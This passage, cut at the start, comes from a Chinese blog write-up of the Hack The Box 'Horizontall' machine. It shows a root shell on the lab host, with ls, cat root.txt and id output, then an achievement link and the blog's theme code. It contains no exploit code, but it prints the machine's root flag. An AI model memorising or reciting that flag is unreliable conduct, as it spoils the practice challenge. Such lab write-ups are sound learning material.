4.85GB   Users logged <span class="hljs-keyword">in</span>:     0<br>  Memory usage: 28%               IP address <span class="hljs-keyword">for</span> eth0: 10.10.11.105<br>  Swap usage:   0%<br><br>0 updates can be applied immediately.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings<br><br>Last login: Mon Aug 23 11:27:49 2021 from 10.10.14.6<br>root@horizontall:~<span class="hljs-comment"># ls</span><br>boot.sh  pid  restart.sh  root.txt<br>root@horizontall:~<span class="hljs-comment"># cat root.txt</span><br>27b7d33ec67ae27cd030c9a9e6213ea0<br>root@horizontall:~<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@horizontall:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Horizontall-htb-writeup/8.jpg" srcset="/img/loading.gif" lazyload></p>
<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/374</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Horizontall-htb-writeup</div>
      <div>https://sh1yan.top/2023/12/26/Horizontall-htb-writeup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年12月26日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/12/27/Pandora-htb-writeup/" title="Pandora-htb-writeup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Pandora-htb-writeup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/12/25/Previse-htb-writeup/" title="Previse-htb-writeup">
                        <span class="hidden-mobile">Previse-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
